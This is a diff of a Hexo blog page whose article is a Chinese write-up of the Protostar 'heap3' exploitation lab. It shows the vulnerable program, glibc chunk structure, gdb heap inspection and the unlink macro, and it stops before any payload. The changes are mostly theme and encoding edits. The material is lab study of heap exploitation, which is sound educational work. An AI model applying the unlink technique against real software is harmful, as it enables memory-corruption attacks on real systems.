@@ -4,7 +4,6 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="baidu-site-verification" content="codeva-1wZQQJBzcr" />
     <meta name="keywords" content="Pwn-protostar靶场8 heap three, Linux，二进制，IoT，CTF">
     <meta name="description" content="protostar靶场day8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -19,17 +18,8 @@
 
 
     <title>Pwn-protostar靶场8 heap three | 8023</title>
-    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.png">
     
-    <style>
-        body{
-            background-image: url(/medias/featureimages/17.jpg);
-            background-repeat:no-repeat;
-            background-size: 100% 100%;
-            background-attachment:fixed;
-        }
-    </style>
-
 
 
     <!-- bg-cover style     -->
@@ -62,9 +52,7 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1">
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-</head>
+<meta name="generator" content="Hexo 7.3.0"></head>
 
 
 <body>
@@ -248,7 +236,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/Pr0b1em" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -305,7 +293,7 @@
     }
 </style>
 
-<a href="https://github.com/Pr0b1em" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -321,19 +309,6 @@
 </header>
 
     
-<script src="/libs/cryptojs/crypto-js.min.js"></script>
-<script>
-    (function() {
-        let pwd = '';
-        if (pwd && pwd.length > 0) {
-            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
-                alert('密码错误，将返回主页！');
-                location.href = '/';
-            }
-        }
-    })();
-</script>
-
 
 
 
@@ -366,12 +341,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn/">
-                                <span class="chip bg-color">pwn</span>
-                            </a>
-                        
                             <a href="/tags/%E7%AC%94%E8%AE%B0/">
                                 <span class="chip bg-color">笔记</span>
+                            </a>
+                        
+                            <a href="/tags/pwn/">
+                                <span class="chip bg-color">pwn</span>
                             </a>
                         
                     </div>
@@ -404,14 +379,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5k
+                    5.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    24 分
+                    25 分
                 </div>
                 
 
@@ -425,50 +400,25 @@
         </div>
         <hr class="clearfix">
 
-        <!-- 代码块功能依赖 -->
-        <script type="text/javascript" src="/libs/codeBlock/codeBlockFunction.js"></script>
-
-
-        <!-- 代码块复制 -->
-        
-        <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-        
-
-        <!-- 代码块收缩 -->
-        
-        <script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-        
-
-        <!-- 代码块折行 -->
-        
-        <style type="text/css">
-        code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
-        </style>
         
 
         
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
-        
-
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <span id="more"></span>
-
-<h1 id="Pwn-protostar靶场8-heap-three"><a href="#Pwn-protostar靶场8-heap-three" class="headerlink" title="Pwn-protostar靶场8 heap three"></a>Pwn-protostar靶场8 heap three</h1><h2 id="heap3"><a href="#heap3" class="headerlink" title="heap3"></a>heap3</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+                <h1 id="Pwn-protostar靶场8-heap-three"><a href="#Pwn-protostar靶场8-heap-three" class="headerlink" title="Pwn-protostar靶场8 heap three"></a>Pwn-protostar靶场8 heap three</h1><h2 id="heap3"><a href="#heap3" class="headerlink" title="heap3"></a>heap3</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 
 <span class="token keyword">void</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  #定义了一个名为winner的函数
-<span class="token punctuation">{</span>
+<span class="token punctuation">&#123;</span>
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"that wasn't too bad now, was it? @ %d\n"</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出字符串
-<span class="token punctuation">}</span>
+<span class="token punctuation">&#125;</span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  #主函数，从终端接收输入
-<span class="token punctuation">{</span>
+<span class="token punctuation">&#123;</span>
   <span class="token keyword">char</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token operator">*</span>b<span class="token punctuation">,</span> <span class="token operator">*</span>c<span class="token punctuation">;</span>  #声明了三个字符指针 a、b 和 c，用于指向后面通过 malloc 分配的内存
 
   a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #给a分配了<span class="token number">32</span>字节的内存
@@ -484,19 +434,19 @@
   <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>  #释放分配给 a 的内存
 
   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"dynamite failed?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出字符串
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p> 程序不复杂，但是想弄懂漏洞的机制还是很复杂的 </p>
+<p>程序不复杂，但是想弄懂漏洞的机制还是很复杂的</p>
 <h3 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h3><p>在malloc.c 源代码中，malloc_chunk 是这样定义的：</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span> <span class="token punctuation">{</span>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span> <span class="token punctuation">&#123;</span>
   INTERNAL_SIZE_T      prev_size<span class="token punctuation">;</span>
   INTERNAL_SIZE_T      size<span class="token punctuation">;</span>
 
   <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd<span class="token punctuation">;</span>
   <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk<span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p> malloc 以块（<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=chunk&amp;spm=1001.2101.3001.7020">chunk</a>）为单位分配内存，其结构如下： </p>
+<p>malloc 以块（<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=chunk&spm=1001.2101.3001.7020">chunk</a>）为单位分配内存，其结构如下：</p>
 <p><img src="/img/1731906755721.png"></p>
 <h4 id="chunk-start："><a href="#chunk-start：" class="headerlink" title="chunk start："></a>chunk start：</h4><p>这是内存块的起始地址。在分配内存时，内存管理器会返回指向这个位置之后的一个指针，具体是mem字段。</p>
 <h4 id="prev-size："><a href="#prev-size：" class="headerlink" title="prev_size："></a>prev_size：</h4><p>前一个块（previous chunk）的大小。前一个块是空闲的时候，这个字段才有意义，因为它会被用于合并空闲块。</p>
@@ -507,17 +457,17 @@
 <h4 id="mem："><a href="#mem：" class="headerlink" title="mem："></a>mem：</h4><p>这通常是指向data区域的指针，也是程序实际使用的内存块的起始地址。注意：这个指针通常会按照某种对齐方式进行调整，确保性能最优。</p>
 <h4 id="next-chunk-start："><a href="#next-chunk-start：" class="headerlink" title="next chunk start："></a>next chunk start：</h4><p>这是下一个内存块的起始地址。内存分配器会使用当前块的size来找到下一个块的起始位置。</p>
 <h3 id="程序动态分析"><a href="#程序动态分析" class="headerlink" title="程序动态分析"></a>程序动态分析</h3><p>用gdb打开程序，在调用mallco，strcpy，free函数的地方下一个断点</p>
-<pre class="line-numbers language-none"><code class="language-none">user@protostar:/opt/protostar/bin$ gdb heap3
+<pre class="line-numbers language-none"><code class="language-none">user@protostar:&#x2F;opt&#x2F;protostar&#x2F;bin$ gdb heap3
 GNU gdb (GDB) 7.0.1-debian
 Copyright (C) 2009 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+License GPLv3+: GNU GPL version 3 or later &lt;http:&#x2F;&#x2F;gnu.org&#x2F;licenses&#x2F;gpl.html&gt;
 This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "i486-linux-gnu".
+There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
+and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;i486-linux-gnu&quot;.
 For bug reporting instructions, please see:
-&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
-Reading symbols from /opt/protostar/bin/heap3...done.
+&lt;http:&#x2F;&#x2F;www.gnu.org&#x2F;software&#x2F;gdb&#x2F;bugs&#x2F;&gt;...
+Reading symbols from &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;heap3...done.
 (gdb) disassemble main
 Dump of assembler code for function main:
 0x08048889 &lt;main+0&gt;:    push   %ebp
@@ -570,58 +520,58 @@ Dump of assembler code for function main:
 End of assembler dump.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <pre class="line-numbers language-none"><code class="language-none">(gdb) b *0x804889e
-Breakpoint 1 at 0x804889e: file heap3/heap3.c, line 16.
+Breakpoint 1 at 0x804889e: file heap3&#x2F;heap3.c, line 16.
 (gdb) b *0x80488ae
-Breakpoint 2 at 0x80488ae: file heap3/heap3.c, line 17.
+Breakpoint 2 at 0x80488ae: file heap3&#x2F;heap3.c, line 17.
 (gdb) b *0x80488be
-Breakpoint 3 at 0x80488be: file heap3/heap3.c, line 18.
+Breakpoint 3 at 0x80488be: file heap3&#x2F;heap3.c, line 18.
 (gdb) b *0x80488da
-Breakpoint 4 at 0x80488da: file heap3/heap3.c, line 21.
+Breakpoint 4 at 0x80488da: file heap3&#x2F;heap3.c, line 21.
 (gdb) b *0x80488f2
-Breakpoint 5 at 0x80488f2: file heap3/heap3.c, line 22.
+Breakpoint 5 at 0x80488f2: file heap3&#x2F;heap3.c, line 22.
 (gdb) b *0x804890a
-Breakpoint 6 at 0x804890a: file heap3/heap3.c, line 24.
+Breakpoint 6 at 0x804890a: file heap3&#x2F;heap3.c, line 24.
 (gdb) b *0x8048916
-Breakpoint 7 at 0x8048916: file heap3/heap3.c, line 25.
+Breakpoint 7 at 0x8048916: file heap3&#x2F;heap3.c, line 25.
 (gdb) b *0x8048922
-Breakpoint 8 at 0x8048922: file heap3/heap3.c, line 26.
+Breakpoint 8 at 0x8048922: file heap3&#x2F;heap3.c, line 26.
 (gdb) b *0x804892e
-Breakpoint 9 at 0x804892e: file heap3/heap3.c, line 28.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Breakpoint 9 at 0x804892e: file heap3&#x2F;heap3.c, line 28.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p> 运行程序，查看堆的地址 </p>
+<p>运行程序，查看堆的地址</p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) r AAAAAAAA BBBBBBBB CCCCCCCC
-Starting program: /opt/protostar/bin/heap3 AAAAAAAA BBBBBBBB CCCCCCCC
+Starting program: &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;heap3 AAAAAAAA BBBBBBBB CCCCCCCC
 
-Breakpoint 1, 0x0804889e in main (argc=4, argv=0xbffff834) at heap3/heap3.c:16
-16      heap3/heap3.c: No such file or directory.
-        in heap3/heap3.c
+Breakpoint 1, 0x0804889e in main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:16
+16      heap3&#x2F;heap3.c: No such file or directory.
+        in heap3&#x2F;heap3.c
 (gdb) i proc mappings
 process 1664
-cmdline = '/opt/protostar/bin/heap3'
-cwd = '/opt/protostar/bin'
-exe = '/opt/protostar/bin/heap3'
+cmdline &#x3D; &#39;&#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;heap3&#39;
+cwd &#x3D; &#39;&#x2F;opt&#x2F;protostar&#x2F;bin&#39;
+exe &#x3D; &#39;&#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;heap3&#39;
 Mapped address spaces:
 
         Start Addr   End Addr       Size     Offset objfile
-         0x8048000  0x804b000     0x3000          0        /opt/protostar/bin/heap3
-         0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap3
+         0x8048000  0x804b000     0x3000          0        &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;heap3
+         0x804b000  0x804c000     0x1000     0x3000        &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;heap3
          0x804c000  0x804d000     0x1000          0           [heap]
         0xb7e96000 0xb7e97000     0x1000          0
-        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
-        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
-        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
-        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+        0xb7e97000 0xb7fd5000   0x13e000          0         &#x2F;lib&#x2F;libc-2.11.2.so
+        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         &#x2F;lib&#x2F;libc-2.11.2.so
+        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         &#x2F;lib&#x2F;libc-2.11.2.so
+        0xb7fd8000 0xb7fd9000     0x1000   0x140000         &#x2F;lib&#x2F;libc-2.11.2.so
         0xb7fd9000 0xb7fdc000     0x3000          0
         0xb7fe0000 0xb7fe2000     0x2000          0
         0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
-        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
-        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
-        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+        0xb7fe3000 0xb7ffe000    0x1b000          0         &#x2F;lib&#x2F;ld-2.11.2.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1a000         &#x2F;lib&#x2F;ld-2.11.2.so
+        0xb7fff000 0xb8000000     0x1000    0x1b000         &#x2F;lib&#x2F;ld-2.11.2.so
         0xbffeb000 0xc0000000    0x15000          0           [stack]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/img/1731907633413.png"></p>
-<p> 堆的地址为0x804c000-0x804d000，查看堆 </p>
-<pre class="line-numbers language-none"><code class="language-none">(gdb) x/40wx 0x804c000
+<p>堆的地址为0x804c000-0x804d000，查看堆</p>
+<pre class="line-numbers language-none"><code class="language-none">(gdb) x&#x2F;40wx 0x804c000
 0x804c000:      0x00000000      0x00000029      0x00000000      0x00000000
 0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c020:      0x00000000      0x00000000      0x00000000      0x00000fd9
@@ -637,12 +587,12 @@ Mapped address spaces:
 <p>堆的突出显示部分是第一个分配的块。我们可以看到prev_size为0，size为0x28+1（40字节，最低有效位+1表示块正在使用），然后是分配内存的32字节。</p>
 <p>现在执行了第一次内存分配</p>
 <p><img src="/img/1731907773015.png"></p>
-<p>然后用define hook-stop参数在每一步操作停下来后，自动的运行我们设置的命令，可以更方便的展示堆空间的操作 </p>
+<p>然后用define hook-stop参数在每一步操作停下来后，自动的运行我们设置的命令，可以更方便的展示堆空间的操作</p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) define hook-stop
-Type commands for definition of "hook-stop".
-End with a line saying just "end".
-&gt;x/i $eip
-&gt;x/40wx 0x804c000
+Type commands for definition of &quot;hook-stop&quot;.
+End with a line saying just &quot;end&quot;.
+&gt;x&#x2F;i $eip
+&gt;x&#x2F;40wx 0x804c000
 &gt;end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <pre class="line-numbers language-none"><code class="language-none">#输入c执行完内存分配操作
@@ -660,8 +610,8 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 2, 0x080488ae in main (argc=4, argv=0xbffff834) at heap3/heap3.c:17
-17      in heap3/heap3.c
+Breakpoint 2, 0x080488ae in main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:17
+17      in heap3&#x2F;heap3.c
 (gdb) c
 Continuing.
 0x80488be &lt;main+53&gt;:    mov    %eax,0x1c(%esp)
@@ -676,10 +626,10 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 3, 0x080488be in main (argc=4, argv=0xbffff834) at heap3/heap3.c:18
-18      in heap3/heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Breakpoint 3, 0x080488be in main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:18
+18      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p> 现在已经完成了a,b,c的内存分配，继续下一步操作，strcpy会将我们输入的字符串放入堆中 </p>
+<p>现在已经完成了a,b,c的内存分配，继续下一步操作，strcpy会将我们输入的字符串放入堆中</p>
 <p><img src="/img/1731907963698.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) c
 Continuing.
@@ -695,8 +645,8 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 4, main (argc=4, argv=0xbffff834) at heap3/heap3.c:21
-21      in heap3/heap3.c
+Breakpoint 4, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:21
+21      in heap3&#x2F;heap3.c
 (gdb) c
 Continuing.
 0x80488f2 &lt;main+105&gt;:   mov    0xc(%ebp),%eax
@@ -711,8 +661,8 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 5, main (argc=4, argv=0xbffff834) at heap3/heap3.c:22
-22      in heap3/heap3.c
+Breakpoint 5, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:22
+22      in heap3&#x2F;heap3.c
 (gdb) c
 Continuing.
 0x804890a &lt;main+129&gt;:   mov    0x1c(%esp),%eax
@@ -727,11 +677,11 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 6, main (argc=4, argv=0xbffff834) at heap3/heap3.c:24
-24      in heap3/heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Breakpoint 6, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:24
+24      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p> 输入的字符串已经到了指定的位置，现在就来执行最关键的free操作了，执行完这三个free操作后查看堆</p>
-<p> <img src="/img/1731908030205.png"></p>
+<p>输入的字符串已经到了指定的位置，现在就来执行最关键的free操作了，执行完这三个free操作后查看堆</p>
+<p><img src="/img/1731908030205.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) c
 Continuing.
 0x8048916 &lt;main+141&gt;:   mov    0x18(%esp),%eax
@@ -746,8 +696,8 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 7, main (argc=4, argv=0xbffff834) at heap3/heap3.c:25
-25      in heap3/heap3.c
+Breakpoint 7, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:25
+25      in heap3&#x2F;heap3.c
 (gdb) c
 Continuing.
 0x8048922 &lt;main+153&gt;:   mov    0x14(%esp),%eax
@@ -762,8 +712,8 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 8, main (argc=4, argv=0xbffff834) at heap3/heap3.c:26
-26      in heap3/heap3.c
+Breakpoint 8, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:26
+26      in heap3&#x2F;heap3.c
 (gdb) c
 Continuing.
 0x804892e &lt;main+165&gt;:   movl   $0x804ac27,(%esp)
@@ -778,8 +728,8 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 9, main (argc=4, argv=0xbffff834) at heap3/heap3.c:28
-28      in heap3/heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:28
+28      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/img/1731908138374.png"></p>
 <p>现在我们看到了一些意想不到的东西。首先，所有data块中的 prev_size 仍然为 0，但它应该包含前一个data块的大小。其次，虽然 fd 正确指向了下一个空闲块（第一个数据块的地址是 0x0804c028，也就是第二个数据块的地址），但 bk 也没有被设置，还显示的是我们输入的字符串。此外，size字段的最小有效位也没有被设置，这到底是怎么回事？</p>
@@ -790,15 +740,15 @@ Breakpoint 9, main (argc=4, argv=0xbffff834) at heap3/heap3.c:28
 <p>在ptmalloc中，空闲的内存块（也称为”chunk”）通常以双向链表的形式被管理。每个空闲块都有两个指针：</p>
 <p>fd（forward pointer）：指向链表中下一个空闲块的指针。<br>bk（backward pointer）：指向链表中前一个空闲块的指针。</p>
 <p>unlink的源代码如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">#define unlink(P, BK, FD) { \
-  FD = P-&gt;fd;               \
-  BK = P-&gt;bk;               \
-  FD-&gt;bk = BK;              \
-  BK-&gt;fd = FD;              \
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">#define unlink(P, BK, FD) &#123; \
+  FD &#x3D; P-&gt;fd;               \
+  BK &#x3D; P-&gt;bk;               \
+  FD-&gt;bk &#x3D; BK;              \
+  BK-&gt;fd &#x3D; FD;              \
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
